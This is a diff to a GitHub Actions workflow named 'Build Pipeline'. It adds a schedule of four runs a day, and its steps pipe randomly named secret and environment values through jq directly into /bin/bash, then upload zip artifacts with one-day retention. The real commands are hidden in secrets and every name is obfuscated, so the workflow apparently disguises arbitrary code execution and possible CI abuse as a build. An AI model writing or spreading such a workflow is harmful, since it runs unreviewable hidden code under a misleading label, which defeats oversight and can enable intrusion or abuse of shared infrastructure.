@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '45 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,18 +17,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          ig6: ${{ secrets.ig6 }}
+          s74: ${{ secrets.s74 }}
         run: |
-          printf '%s' "$ig6" | jq -r .nssmk7674 | /bin/bash
-          echo $sip2 | jq -r .f59 | /bin/bash
-          printf '%s' "$pve70501" | jq -r .eb0290 | /bin/bash
-          printf '%s' "$h06897" | jq -r .rt15988 | /bin/bash
-          echo $ycqxo38381 | jq -r .qvjh571 | /bin/bash
-          printf '%s' "$cro523" | jq -r .yc71513 | /bin/bash
+          printf '%s' "$s74" | jq -r .fk17557 | /bin/bash
+          echo $il6 | jq -r .dahu54 | /bin/bash
+          printf '%s' "$dji01" | jq -r .kcq754 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: h1SVvvsm
+          name: hgh0L0Qk
           path: "*.zip"
           retention-days: 1
